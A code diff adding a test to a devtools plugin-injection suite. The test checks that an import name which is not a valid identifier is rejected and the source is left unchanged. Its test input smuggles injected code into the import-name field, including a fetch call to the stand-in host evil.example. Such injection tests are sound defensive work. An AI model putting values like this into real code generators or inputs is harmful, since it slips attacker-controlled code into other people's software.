@@ -92,6 +92,26 @@ describe('inject-plugin', () => {
     })
   })
 
+  describe('import name validation', () => {
+    test('should not inject an import name that is not an identifier', () => {
+      const code = `
+        import { TanStackDevtools } from '@tanstack/react-devtools'
+
+        function App() {
+          return <TanStackDevtools plugins={[]} />
+        }
+      `
+
+      const result = testTransform(code, 'some-package', 'Plugin', {
+        importName: 'X } from "x"; fetch("https://evil.example"); import { Y',
+        type: 'function',
+      })
+
+      expect(result.transformed).toBe(false)
+      expect(result.code).toBe(code)
+    })
+  })
+
   describe('named import pattern', () => {
     test('should add plugin to existing empty plugins array', () => {
       const code = `
